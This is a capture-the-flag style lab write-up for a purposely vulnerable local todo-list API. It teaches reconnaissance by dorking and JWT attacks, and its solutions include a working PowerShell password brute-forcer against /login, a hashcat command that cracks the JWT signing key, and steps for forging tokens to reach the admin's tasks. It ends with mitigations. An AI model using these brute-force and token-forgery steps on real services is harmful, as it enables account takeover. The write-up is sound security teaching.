# Vulnerable API

```
Author: Gustaf Nordlander
```

## Goal

The goal of this lab is to examine and perform some techniques and topics relating to APIs and JWTs.
## Background

This is a REST API that allows registered users to make CRUD operations on a database storing tasks. It is essentially a todo list where users can login, get, delete and update the tasks via the API.
## Pre-lab

The endpoints of this API will be explained during the lab.

The lab environment can be found at my [GitHub](https://github.com/Strommingen/VulnerableAPI).
The API is run in a container, to run the container, run the command `docker compose up` and wait for a minute. It should now be available on `localhost:3000`.

Install JWT editor extension on Burp Suite.

### Recommended Approach

My recommended approach to this lab is to **not read** the code at first. If you were to get stuck, read the code and try to find your way after that. If that does not help you can read the answers for the questions as they will walk you through how to do it. But this should be a last resort unless you are looking for a walkthrough, in this case feel free to follow the solutions.

The `.env` file included contains one of the answers to the questions, it is *not* recommended to view this file as it just gives you the answer. It is included for ease of use, without it the user would have to manually create the file with the secrets also, that would mean that the user knows the secret because he or she made it.
## Lab Scenario

You have been tasked with testing the API, the company behind it lists one of its employees **Kalle** as a frequent user of this service and the second to create an account apart from the owner. 
## Recon
### Google Dorking
One method to find hidden information is to use a method called *Google Dorking* or *Google hacking*. This is a method that utilizes google search operators to find passwords, personal data and confidential files.

To find hidden or confidential files, Google's complex search operators can be used to filter search results. *Filetype* for example is a operator that can filter for certain filetypes `filetype: txt` will search for txt files for example and `ext:log` will filter for documents with the `log` extension. There are however many more operators that can be used and this tool can be powerful if used right with combining different operators etc. 

A powerful way to use Google Dorking is to find out if a site is using a particular API by searching for API documentation, endpoints etc. Then the attacker can research the API to find potential vulnerabilities that can potentially be exploited. 
 
 - [More information on Google Dorking](https://www.geeksforgeeks.org/what-is-google-dorking/)

### Github Dorking

GitHub is a great tool for developers to share code and use as a showcase of projects to potential recruiters. However, it is also important to control what is pushed to a GitHub repository. One mistake and your API keys or other secrets that you used for your project might be on full display there. 

Even if you manage to update the repository before anyone else has time to steal the keys it is still stored in the previous commits.

GitHub also has a search feature with search operators. This can be used like with Google Dorking to find these secrets like API keys. 

- [More information on GitHub Dorking](https://medium.com/@pawan_rawat/github-recon-for-finding-sensitive-information-aecdeb9c9dce)

## JWT Structure

JSON Web Tokens is a standard for transmitting, in a secure way, information between two parties. It is used to authenticate and validate users. It is also used to ensure safe communication between clients and servers. The information is verifiable because the token is signed by an algorithm like the HMAC or RSA algorithms. It is a common practice to use JWTs in APIs.

The structure of a JWT consists of three parts, the header, payload and the signature. These parts are separated by dots so that it looks like this:
```
header.payload.signature
```

The header has the metadata needed for the token like the algorithm used for the signing, the payload has the data being transmitted and the signature is just the signature.

All this information is then encoded using Base64. It might look something like this: 
```
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VyTmFtZSI6InVzZXIiLCJ1c2VySWQiOjMwMCwiaWF0IjoxNzQyMDUwNDA3LCJleHAiOjE3NDIwNTQwMDd9.LeFMHpq_XkSlWEqThrSCcPhR5Fv76_cbXCdYl4xZk0VwQwv-JgOmW8ZyC4PaEWjJbjpafplb-3PcJ1IjQVc3XA
```

The fact that the token is encoded using Base64 means that it can be very easily decoded also. If you were to run the JWT above through a Base64 decoder you would get:
```
{"alg":"HS512","typ":"JWT"}{"userName":"user","userId":300,"iat":1742050407,"exp":1742054007}-áL)V¤á­ >yþúqµÂuxÅ4W0¼oÈ.hE£%¸éiúeosÜ'R#AW7\
```

From the header part we see that the token is using the `HS523` algorithm to sign it. We also get the username and user id from the payload. The `iat` and `exp` parameters tells the server if the token is expired or not. And lastly we get some gibberish from the signing part.

## Initial Access

In order to gain access to the CRUD operations the API has to offer a JWT needs to be sent with the requests authorizing the user to perform these operations. The JWT grants authorization to the task list specific to the user that the JWT is associated with. 

A JWT is received after the user has logged in using the POST `/login` endpoint providing a *username* and *password* in JSON format.

The API should also protect from certain attacks since a developer has implemented a [rate limiter](https://www.cloudflare.com/learning/bots/what-is-rate-limiting/) but this was **poorly done**.

The endpoints available: 
- `/login` - GETs the login page.
- `/login` - POSTs the users username and password to retrieve a JWT.
- `/tasks` - GETs all the tasks associated with the user. 
- `/tasks/:id` - GETs a specific task with that ID.
- `/tasks` - POSTs a new task and associates it with the user.
- `/tasks/:id` - PUT (update) a task, needed in request body: taskName, description, status.
- `/tasks/:id` - DELETEs a task with that ID.

You can interact with the API using whatever method you prefer like cURL or [Postman](https://www.postman.com/downloads/) as there is currently no HTML or CSS implemented apart from the login page, it is only a JS API.

#### Q1: What tasks does the user kalle have to complete?

Note that you are meant to brute force the users password and then interact with the API to retrieve the tasks.

Hints: 
- The password can be found in a common wordlist
- A script might be needed to brute force the `/login` endpoint
- Only two parameters is needed for the JSON body, one has already been provided.
- The response parameter that is interesting to us is `Cookies`

##### Solution

<details>
	<summary>Click to reveal the solution</summary>
	
The common wordlist from the hint is `rockyou.txt`, this combined with a powershell script like:
```
$passwords = Get-Content $args[0]
for ($i = 0; $i -lt $passwords.Length; $i++) {
    $pass = $passwords[$i].Trim()
    $body = @{username=$args[1]; password=$pass} | ConvertTo-Json -Compress

    try{
        $response = Invoke-WebRequest -Uri "http://localhost:3000/login" `
            -Method Post `
            -Headers @{"Content-Type"="application/json"} `
            -Body $body -SessionVariable session -ErrorAction Stop
    } catch{
        continue
    }

    if ($response.StatusCode -eq 200) {
        $jwt = $session.Cookies.GetCookies("http://localhost:3000") | Where-Object { $_.Name -eq "jwt" } | Select-Object -ExpandProperty Value

        if ($jwt) {
            Write-Output "$pass : $jwt"
        }
        break
    }
}
```

Used with the command:
```
./jwtBrute.ps1 "\path\to\rockyou.txt" "kalle"
```
Can brute force the password so that a JWT is obtained.

This .ps1 file is included in the repository.

Now it is possible to interact as `kalle` with the API and make CRUD operations on his tasks. A program like [Postman](https://www.postman.com/downloads/) is my recommendation for this. 

In Postman make a GET request to the endpoint `/tasks` including the header with the key: `Cookie` and value: jwt=JWT.
	
</details>

## Getting past the JWT
### Cracking the JWT

As mentioned before, JWTs are signed to ensure validity to the server. This is not a pre shared key with the client, in reality, the client should never know the secret key. 

Now that you have a valid token from the user `kalle` you can try to find out the key that was used to sign the JWT.
#### Q2: What is the secret key used to sign the token?

Note: Considering you should now know the user `kalle`s password you can just use the `/login` endpoint with the correct login details in the body of the request. This might be important to remember since the JWTs have an expiration.

##### Solution

<details>
<summary>Click to reveal the solution</summary>

Retrieve a JWT with the POST `/login` endpoint. This JWT can now be used with hashcat to crack the JWT key. The key can be found in [rockyou.txt](https://github.com/zacheller/rockyou). 

The hashcat command: 
```
hashcat -a 0 -m 16500 JWT /path/to/rockyou.txt
```
#### A3: What values are used in this APIs JWTs payload?

Since the JWT is not encrypted, the payload can be decoded easily by decoding with a Base64 decoder. [CyberChef](https://gchq.github.io/CyberChef/) can be used or straight in the terminal with:
```
echo "base64 payload" | base64 -d
```

The parameters are: userName, userId, iat, exp.

</details>

### Signing the JWT

In order for JWTs to be effective, proper implementation is required. If a developer does not follow best practices and proper implementation the API can be vulnerable to some vulnerabilities. For instance the signing of the JWT is very important and it then follows that the verification of the JWT is as important. 

The header and payload section of the JWT is not encrypted in this API, this means that it is only encoded in Base64. So if you are able to retrieve a JWT you can view the payload and change it. If JWT is properly implemented, any change in the payload will make the JWT void and the server will not accept it.

There are two ways to get around this in this API. One has to do with the secret key you previously obtained and the other has to do with the improper implementation of the verification of the JWT.

In some APIs one of the values in the payload of the JWT is the `role` value. This can tell the server if the user is an admin or not. If the API does not verify the JWT properly it can be exploited without knowing the admin password. 

PortSwigger has a great [lab](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature) for this vulnerability.

#### Q3: What values are used in this APIs JWTs payload?

##### Solution

<details>
<summary>Click to reveal the solution</summary>

Since the JWT is not encrypted, the payload can be decoded easily by decoding with a Base64 decoder. [CyberChef](https://gchq.github.io/CyberChef/) can be used or straight in the terminal with:
```
echo "base64 payload" | base64 -d
```

The parameters are: userName, userId, iat, exp.

</details>

#### Q4: Describe the two ways to get around the JWT verification

Hint:
- [jwt.io](https://jwt.io/) is a great tool

##### Solution

<details>
<summary>Click to reveal the solution</summary>

##### A4.1
Since you should have a valid JWT at this point and knowledge of the payload values you can change the userId value in the payload to what the admin is using. The userId value is the only value that needs to change since that is what the API uses to authorize the user. When the payload is changed we can generate a new payload with a tool like  [jwt.io](https://jwt.io/) to get the proper formatting. Then we can copy the new payload section of this generated JWT and replace the previous payload with it.

This is caused by the improper implementation of the verification of the JWT. It does not actually verify it, it just decodes it.

##### A4.2
The other way is to use the secret key used to sign the JWT that we cracked previously. We can again use the tool [jwt.io](https://jwt.io/) but this time we can sign the JWT and use the whole JWT instead of just the payload. This is because the JWT secret key was weak enough to allow us to crack it.

Another way is to use Burp Suite with the JWT Editor extension. A POST request to the `/login` form can be made with the repeater.

Get a valid JWT by filling out the form with a proxy browser connected to Burp Suite.

Now make a request to the `/tasks` endpoint via the proxy browser. Enter the `Poxy > HTTP history` tab and send the GET request to the repeater. Enter the repeater tab and then to `Request > JSON Web Token`.

Change the *userId* value in the payload to 1.

</details>

#### Q5: What tasks does user admin have to complete?

Hint:
- The admin account has a very low user ID

##### Solution

<details>
<summary>Click to reveal the solution</summary>

Since kalle is user 2, you can guess that the admin user is user 1. Use one of the methods from Q4. If you choose the first option to generate a JWT, you can use it in Postman in the header of a GET request to the `/tasks` endpoint.

</details>

## Bonus question

Consider question 1 the poorly implemented rate limiter and in question 4 the JWT verification was the vulnerabilities respectively, can you, by static analysis of the code spot why it was not effective in stopping your attack?

### Mitigation

The brute force attack can be mitigated by applying the rate limiter to the `/` endpoint instead of the unused `/api/`, or even the `/login` endpoint. This mistake was present before I decided to make this old project into this kind of lab. 

Now the verification for the JWT is faulty, it only decodes the JWT and not verifying it. This can be prevented by using the *correct* methods. Reading documentation is important and would probably prevent this mistake. This API uses `decode()` when it should be using `verify()`.
